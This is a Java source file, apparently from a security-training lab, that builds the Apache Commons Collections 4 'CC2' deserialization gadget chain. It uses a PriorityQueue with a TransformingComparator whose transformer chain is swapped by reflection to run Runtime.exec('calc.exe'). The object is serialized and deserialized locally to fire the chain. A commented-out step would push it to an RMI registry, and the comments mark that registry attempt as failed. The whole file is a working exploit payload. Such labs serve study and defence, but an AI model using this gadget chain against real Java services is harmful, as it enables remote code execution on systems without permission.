package com.madaha.codesecone.controller.AdvancedAttack.deserialize.rmiDeserialize;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

// 改用 CC2_PriorityQueue 链进行测试.
// 被序列化的对象，必须要implement Remote接口。
// fail 失败！！
public class ToAttackRegistry_Server_test_java8_CC2_fail_Remote {

    public static void main(String[] args) throws Exception {
        ToAttackRegistry_Server_test_java8_CC2_fail_Remote eval = new ToAttackRegistry_Server_test_java8_CC2_fail_Remote();


//        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1234);
//        registry_remote.bind("HelloRegistry", eval.eval());     //被序列化的对象，必须要implement Remote接口
//        System.out.println("rmi start at 1099");


        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(eval.eval());
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }

    public Object eval() throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{
                new ConstantTransformer(1)
        };

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1),
        };

        Transformer faketransformerchain =  new ChainedTransformer(fakeTransformers);
        TransformingComparator comparator = new TransformingComparator(faketransformerchain);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(1);

        setFieldValue(faketransformerchain, "iTransformers", transformers);

        return queue;
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

}
